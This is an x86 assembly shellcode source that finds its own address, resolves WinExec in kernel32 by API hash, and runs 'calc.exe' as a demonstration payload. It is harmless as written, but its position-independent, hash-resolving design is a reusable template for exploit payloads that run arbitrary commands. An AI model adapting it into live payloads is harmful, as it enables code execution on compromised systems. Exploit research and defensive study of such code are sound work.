[ORG 0]
[BITS 32]

entry:
  ; store context
  push ebx                              ; store ebx
  push ebp                              ; store ebp
  mov ebp, esp                          ; create new stack frame
  and esp, 0xFFFFFFF0                   ; ensure stack is 16 bytes aligned

  ; calculate entry address
  call calc_entry_addr                  ; calculate the entry address
  flag_CEA:                             ; flag for calculate entry address

  ; find "kernel32.dll, WinExec"
  cld                                   ; clear the direction flag
  push 0x61DA2999                       ; set hash key
  push 0x0AE20914                       ; set function hash
  call find_api                         ; try to find api address
  test eax, eax                         ; check target function is found
  jz not_found                          ;

  ; call "kernel32.dll, WinExec"
  lea edx, [ebx+command]                ; lpCmdLine
  xor ecx, ecx                          ; clear ecx
  mov cl, [ebx+cmd_show]                ; set uCmdShow
  push ecx                              ; push uCmdShow
  push edx                              ; push lpCmdLine
  call eax                              ; call api function

  not_found:                            ;
  ; restore context
  mov esp, ebp                          ; restore stack
  pop ebp                               ; restore ebp
  pop ebx                               ; restore ebx
  ret                                   ; return to the caller

; calculate shellcode entry address
calc_entry_addr:
  pop eax                               ; get return address
  lea ebx, [eax-flag_CEA]               ; calculate entry address.
  push eax                              ; push return address
  ret                                   ; return to entry

hash_api:
  %include "src/x86/find_api.asm"

command:
  db "calc.exe", 0

cmd_show:
  db 1
